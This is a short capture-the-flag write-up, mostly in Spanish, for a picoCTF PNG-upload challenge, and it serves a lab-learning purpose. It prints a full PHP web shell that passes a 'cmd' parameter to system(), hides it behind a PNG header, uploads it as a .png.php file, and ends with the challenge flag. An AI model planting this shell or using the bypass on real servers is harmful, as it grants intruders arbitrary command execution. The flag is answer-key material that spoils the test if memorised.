## Descripción
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:49318/)!

## Solución
Al abrir la página se tiene una webapp para subir imagenes y se valida su tipo en hexadecimal
Al buscar robots.txt se aprecia que se tiene una sección de uploads donde están todos los archivos subidos
Para esto se prepara un input de web shell obtenido de internet con php
```
PNG
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```
Se convierte en .png.php y se sube
Se abre en uploads el archivo subido
Se hace cat al archivo GNTDOMBWGIZDE.txt y se obtiene la bandera

```
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_3f706222}
```
